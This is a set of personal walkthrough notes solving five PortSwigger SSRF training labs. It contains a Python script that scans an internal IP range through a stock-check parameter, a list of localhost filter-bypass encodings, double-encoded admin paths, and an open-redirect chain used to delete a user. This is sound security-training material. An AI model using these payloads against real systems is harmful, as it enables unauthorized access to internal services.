---
created: 2026-05-03
---
>[!note]+ Labs are numbered as per order in [the SSRF vulnerabilities](https://portswigger.net/web-security/all-labs#server-side-request-forgery-ssrf).

| `#`  | Solved? | Name                                                       | Date    | Notes         |
| ---- | ------- | ---------------------------------------------------------- | ------- | ------------- |
| `1.` | `✓`     | Basic SSRF against the local server                        | `03.05` |               |
| `2.` | `✓`     | Basic SSRF against another back-end system                 | `04.05` |               |
| `3.` |         | Blind SSRF with out-of-band detection                      | `23.06` | #Collaborator |
| `4.` | `✓`     | SSRF with blacklist-based input filter                     | `04.05` |               |
| `5.` | `✓`     | SSRF with filter bypass via open redirection vulnerability | `05.05` |               |

## 1. Basic SSRF against the local server

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Basic SSRF against the local server`](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)
> - Level: #Apprentice 
> 
> This lab has a stock check feature which fetches data from an internal system.
> 
> To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user carlos.

### Solution

- First, navigate to any product and test the `Check stock` functionality:

![[images/walkthrough/PortSwigger/SSRF/lab1/1.png]]

- Inspect the request carefully, send it to `Repeater`. The URL of the stock API is sent in the `stockApi` `POST` parameter:

![[images/walkthrough/PortSwigger/SSRF/lab1/2.png]]

- Change the URL to `http://localhost/admin`:

![[images/walkthrough/PortSwigger/SSRF/lab1/3.png]]

- Send the request:

![[images/walkthrough/PortSwigger/SSRF/lab1/4.png]]

- You get access to the admin panel. Delete the `carlos` user by changing the URL to `http://localhost/admin/delete?username=carlos`:

![[images/walkthrough/PortSwigger/SSRF/lab1/5.png|729]]

![[images/walkthrough/PortSwigger/SSRF/lab1/solved.png]]

Solved!
## 2. Basic SSRF against another back-end system

>[!done]

>[!note]+ Lab description
> - [`Lab: Basic SSRF against another back-end system`](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)
> - Level: #Apprentice 
> 
> This lab has a stock check feature which fetches data from an internal system.
> 
> To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port `8080`, then use it to delete the user `carlos`.

### Solution

- The vulnerability is again in the `Check stock` functionality:

![[images/walkthrough/PortSwigger/SSRF/lab2/1.png]]

- Observe that if you submit an invalid destination the application can't reach, you get `500 Internal Server Error`:

![[images/walkthrough/PortSwigger/SSRF/lab2/2.png]]

- You can solve it using a Python script:

```Python
import requests
import colorama

host = "0a8e00a603faa5c380f9581c009500fa.web-security-academy.net"
path = "/product/stock"
url = 'https://' + host + path

# define the headers to mimic a real browser
headers = {
    'Host': host,
    'Cache-Control': "max-age=0",
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': url,
    'Connection': 'close',
    'Referer': url,
    'Priority': 'u=0, i',
}

def check_ip_address(ip_address, port):
    post_url = f'http://{ip_address}:{str(port)}/admin'
    post_data = {
        'stockApi': post_url
    }
    print('##########')
    print(f'POST request to the URL {post_url}')
    response = requests.post(url, data=post_data, headers=headers, allow_redirects=False)
    return response

def try_until_success():
    for i in range(1, 254):
        response = check_ip_address(f'192.168.0.{i}', 8080)
        print(response.status_code)
        if response.status_code in [200, 201]:
            print(f'STATUS: {colorama.Fore.BLUE} {str(response.status_code)} {response.reason} {colorama.Style.RESET_ALL}')
            break
        else:
            print(f'STATUS: {str(response.status_code)} {response.reason}')

if __name__ == '__main__':
    try_until_success()
```

```bash
python3 script.py
```

```bash
# <SNIP>
POST request to the URL http://192.168.0.187:8080/admin
500
STATUS: 500 Internal Server Error
##########
POST request to the URL http://192.168.0.188:8080/admin
200
STATUS:  200 OK 
```

- Change the address to the one you identified in `Repeater` to access the admin panel:

![[images/walkthrough/PortSwigger/SSRF/lab2/4.png]]

- Then delete the `carlos` user:

![[images/walkthrough/PortSwigger/SSRF/lab2/5.png]]


![[images/walkthrough/PortSwigger/SSRF/lab2/solved.png]]

Solved!
## 3. Blind SSRF with out-of-band detection

>[!warning] #Collaborator  Burp Collaborator (Professional Edition) is required to solve this lab.

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Blind SSRF with out-of-band detection`](https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection)
> - Level: #Practitioner 
> 
> This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.
> 
> To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server.

### Solution

- Load a product page and send the request to `Repeater`. Insert a URL to your `Collaborator` domain in the `Referer` header, and send the request:

![[images/walkthrough/PortSwigger/SSRF/lab3/1.png]]

- Go to `Collaborator` -> `Poll now`. See interactions:

![[images/walkthrough/PortSwigger/SSRF/lab3/2.png]]

![[images/walkthrough/PortSwigger/SSRF/lab3/solved.png]]

Solved!
## 4. SSRF with blacklist-based input filter

>[!done]

>[!note]+ Lab description
> - [`Lab: SSRF with blacklist-based input filter`](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)
> - Level: #Practitioner 
> 
> This lab has a stock check feature which fetches data from an internal system.
> 
> To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.
> 
> The developer has deployed two weak anti-SSRF defenses that you will need to bypass.

### Solution

- The vulnerable functionality is again `Stock Check`, in `stockApi` `POST` parameter:

![[images/walkthrough/PortSwigger/SSRF/lab4/1.png]]

- The goal is to access the admin page at `http://localhost`. Try to replace the link directly. You get `400 Bad Request`:

```bash
"External stock check blocked for security reasons"
```

![[images/walkthrough/PortSwigger/SSRF/lab4/2.png]]

- Try common bypasses (see [[SSRF#Bypassing validation]]). Send the request to `Intruder` and fuzz the following payloads:

```
127.0.0.1
127.20.13.11
2130706433
0177.0.0.1
0x7f000001
127.1
127.0.1
0
0.0.0.0
127。0。0。1
127.000000000000000000.1
[::]
```

![[images/walkthrough/PortSwigger/SSRF/lab4/3.png]]

- Observe the results of the attack and see that two requests returned `200 OK`:

```
http%3a%2f%2f127.0.1
```

 ![[images/walkthrough/PortSwigger/SSRF/lab4/4.png]]


- However, if you try to access `http://127.0.1/admin`, the request is blocked again:

```
http%3a%2f%2f127.0.1%2fadmin
```

![[images/walkthrough/PortSwigger/SSRF/lab4/5.png]]

- Try to bypass restrictions by encoding one of the characters using URL encoding (e.g., `%61dmin` instead of `admin`):

```
http%3a%2f%2f127.0.1%2f%61dmin
```

![[images/walkthrough/PortSwigger/SSRF/lab4/6.png]]


- Try double URL encoding, and get access:

```
http%3a%2f%2f127.0.1%2f%2561dmin
```

![[images/walkthrough/PortSwigger/SSRF/lab4/7.png]]

- Delete the `carlos` user:

```
http%3a%2f%2f127.0.1%2f%2561dmin%2fdelete%3fusername%3dcarlos
```


![[images/walkthrough/PortSwigger/SSRF/lab4/8.png]]


![[images/walkthrough/PortSwigger/SSRF/lab4/solved.png]]

Solved!
## 5. SSRF with filter bypass via open redirection vulnerability

>[!done]

>[!note]+ Lab description
> - [`Lab: SSRF with filter bypass via open redirection vulnerability`](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)
> - Level: #Practitioner 
> 
> This lab has a stock check feature which fetches data from an internal system.
> 
> To solve the lab, change the stock check URL to access the admin interface at `http://192.168.0.12:8080/admin` and delete the user carlos.
> 
> The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.

### Solution


- The vulnerable functionality is again `Stock Check`, in `stockApi` `POST` parameter:

![[images/walkthrough/PortSwigger/SSRF/lab5/1.png]]

- This time, however, trying to access `http://192.168.0.12/admin` results in the following error:

```
"Invalid external stock check url 'Invalid URL'"
```

![[images/walkthrough/PortSwigger/SSRF/lab5/2.png]]

- Also notice that the original `stockApi` parameter didn't have an address, meaning that the target's domain is implied. 
- Combined with the error above, you can infer that the application checks that the destination URL is on the same website.

- One of the bypasses you can try in this case is via **open redirect vulnerability**. On its own, it's quite harmless and rarely qualifies for bug bounty if you find it in the wild, for example. But combined with SSRF, it can be used to bypass filters. 

---

- Browsing the application, you find a `Next product` button under product description:

![[images/walkthrough/PortSwigger/SSRF/lab5/3.png]]

- The request contains the `path` parameter, the exact value of which appears in the `Location:` header of the redirect response. This patter is the signature of open redirects.
- Send the request to `Repeater` and change the `path` parameter to check where the application redirects:

![[images/walkthrough/PortSwigger/SSRF/lab5/4.png]]

- `path` set to `http://192.168.0.12:8080/admin` results in a redirect to that location. This confirms the open redirect.
- Now copy the link of that request and paste it as a `stockApi` — but without the schema and domain:

```powershell
stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin
```

```powershell
stockApi=%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a%2f%2f192.168.0.12%3a8080%2fadmin
```

![[images/walkthrough/PortSwigger/SSRF/lab5/5.png]]

- Delete the `carlos` user:

```powershell
stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos
```

```powershell
stockApi=%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a%2f%2f192.168.0.12%3a8080%2fadmin%2fdelete%3fusername%3dcarlos
```

![[images/walkthrough/PortSwigger/SSRF/lab5/6.png]]

![[images/walkthrough/PortSwigger/SSRF/lab5/solved.png]]

Solved!